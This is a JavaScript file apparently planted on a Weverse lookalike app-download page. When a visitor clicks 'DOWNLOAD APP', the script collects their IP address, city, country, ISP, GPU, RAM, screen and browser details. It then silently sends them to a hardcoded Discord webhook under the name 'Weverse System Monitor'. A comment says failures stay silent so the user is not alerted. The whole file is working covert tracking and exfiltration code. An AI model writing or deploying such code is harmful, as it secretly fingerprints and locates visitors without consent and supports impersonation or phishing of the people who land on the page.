(function() {
    const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1490554460328558644/S7cOigqa2H5_7H9nsKiuzZ93l_Ut0bnbq2TE4svo5vYcdlOxsp15Uz33Oxf11PWeztgu';

    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return "Unknown GPU";
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown Renderer";
        } catch (e) {
            return "N/A";
        }
    }

    function getScreenInches() {
        // Estimation based on 96 PPI (Standard)
        const width = window.screen.width * window.devicePixelRatio;
        const height = window.screen.height * window.devicePixelRatio;
        const diagonalPixels = Math.sqrt(Math.pow(width, 2) + Math.pow(height, 2));
        const estimatedInches = (diagonalPixels / 96).toFixed(1);
        return estimatedInches + '" (Estimated)';
    }

    function getBrowserInfo() {
        const ua = navigator.userAgent;
        let bName = "Unknown";
        let bVer = "Unknown";

        if (ua.indexOf("Firefox") > -1) {
            bName = "Firefox";
            const match = ua.match(/Firefox\/([\d.]+)/);
            if (match) bVer = match[1];
        } else if (ua.indexOf("SamsungBrowser") > -1) {
            bName = "Samsung Browser";
            const match = ua.match(/SamsungBrowser\/([\d.]+)/);
            if (match) bVer = match[1];
        } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
            bName = "Opera";
            const match = ua.match(/OPR\/([\d.]+)/) || ua.match(/Opera\/([\d.]+)/);
            if (match) bVer = match[1];
        } else if (ua.indexOf("Trident") > -1) {
            bName = "Internet Explorer";
            const match = ua.match(/rv:([\d.]+)/);
            if (match) bVer = match[1];
        } else if (ua.indexOf("Edg") > -1) {
            bName = "Microsoft Edge";
            const match = ua.match(/Edg\/([\d.]+)/);
            if (match) bVer = match[1];
        } else if (ua.indexOf("Chrome") > -1) {
            bName = "Google Chrome";
            const match = ua.match(/Chrome\/([\d.]+)/);
            if (match) bVer = match[1];
        } else if (ua.indexOf("Safari") > -1) {
            bName = "Safari";
            const match = ua.match(/Version\/([\d.]+)/);
            if (match) bVer = match[1];
        }
        return `${bName} v${bVer}`;
    }

    async function sendTrackingData() {
        try {
            const geoResponse = await fetch('https://ipapi.co/json/');
            const geo = await geoResponse.json();

            const payload = {
                username: "Weverse System Monitor",
                avatar_url: "https://weverseofficial.com/5bJcTdh.png",
                embeds: [{
                    title: "📥 New Application Download",
                    color: 5249476,
                    thumbnail: { url: "https://weverseofficial.com/5bJcTdh.png" },
                    fields: [
                        {
                            name: "🚩 Location",
                            value: `:flag_${geo.country_code ? geo.country_code.toLowerCase() : 'white'}: **${geo.city || 'Unknown'}, ${geo.country_name || 'Unknown'}**\n\`IP: ${geo.ip}\``,
                            inline: false
                        },
                        {
                            name: "💻 Client Details",
                            value: `**OS:** ${navigator.platform}\n**Browser:** ${getBrowserInfo()}`,
                            inline: true
                        },
                        {
                            name: "📏 Display Specs",
                            value: `**Resolution:** ${screen.width}x${screen.height}\n**Screen Size:** ${getScreenInches()}`,
                            inline: true
                        },
                        {
                            name: "🎮 Hardware Info",
                            value: `**GPU:** \`${getGPUInfo()}\`\n**RAM:** ~${navigator.deviceMemory || 'Unknown'} GB`,
                            inline: false
                        },
                        {
                            name: "🌐 Network & Time",
                            value: `**ISP:** ${geo.org || 'Unknown'}\n**Date:** ${new Date().toLocaleString('tr-TR')}`,
                            inline: false
                        }
                    ],
                    footer: { text: "Weverse Web Services • Real-time Hardware Analysis" }
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

        } catch (error) {
            // Silently fail to not alert the user
        }
    }

    document.addEventListener('DOMContentLoaded', function() {
        const downloadBtns = document.querySelectorAll('a[title="DOWNLOAD APP"]');
        downloadBtns.forEach(btn => {
            btn.addEventListener('click', sendTrackingData);
        });
    });
})();
